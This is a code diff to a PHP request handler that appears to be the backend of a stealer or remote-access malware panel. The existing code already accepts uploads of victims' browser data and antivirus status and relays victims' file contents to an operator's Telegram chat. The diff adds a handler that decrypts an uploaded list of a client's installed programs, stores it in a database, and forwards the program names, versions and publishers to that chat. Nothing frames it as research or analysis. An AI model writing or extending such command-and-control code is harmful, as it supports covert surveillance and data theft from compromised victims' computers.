@@ -1,4 +1,5 @@
 <?php
+
 namespace Handlers;
 
 use Services\LoggerService;
@@ -76,6 +77,8 @@ class ClientRequestHandler
                 return $this->handleUploadBrowserData($clientId, $data);
             case 'upload_antivirus_status':
                 return $this->handleUploadAntivirusStatus($clientId, $data);
+            case 'upload_installed_programs':
+                return $this->handleUploadInstalledPrograms($clientId, $data);
             default:
                 return ['error' => 'Unknown action'];
         }
@@ -596,6 +599,55 @@ class ClientRequestHandler
         } else {
             $message = "Content of `$filePath`:\n```\n$content\n```";
             $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+        }
+    }
+
+    private function handleUploadInstalledPrograms(string $clientId, array $data): array
+    {
+        try {
+            $this->logger->logWebhook("Installed Programs Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
+            $programsData = $data['installed_programs'] ?? null;
+
+            if (!$programsData) {
+                $this->logger->logError("Installed programs upload failed: Missing installed_programs");
+                http_response_code(400);
+                return ['error' => 'Missing installed_programs'];
+            }
+
+            $decryptedProgramsData = $this->encryption->decrypt($programsData);
+            if ($decryptedProgramsData === '') {
+                $this->logger->logError("Installed programs decryption failed for client_id: $clientId");
+                http_response_code(400);
+                return ['error' => 'Decryption failed'];
+            }
+
+            $programsJson = json_decode($decryptedProgramsData, true);
+            if (!$programsJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logger->logError("Invalid installed programs data format for client_id: $clientId, decrypted: " . substr($decryptedProgramsData, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid data format'];
+            }
+
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
+            VALUES (?, 'installed_programs', ?, NOW())"
+            );
+            $stmt->execute([$clientId, $decryptedProgramsData]);
+
+            $message = "🖥️ Installed Programs Received:\n";
+            $message .= "Client ID: $clientId\n";
+            $message .= "Programs: " . count($programsJson) . "\n";
+            foreach ($programsJson as $program) {
+                $message .= "- {$program['name']} (Version: {$program['version']}, Publisher: {$program['publisher']})\n";
+            }
+            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+
+            $this->logger->logWebhook("Installed programs processed for client_id: $clientId");
+            return ['status' => 'success'];
+        } catch (\Exception $e) {
+            $this->logger->logError("Installed programs upload failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Upload failed: ' . $e->getMessage()];
         }
     }
 }
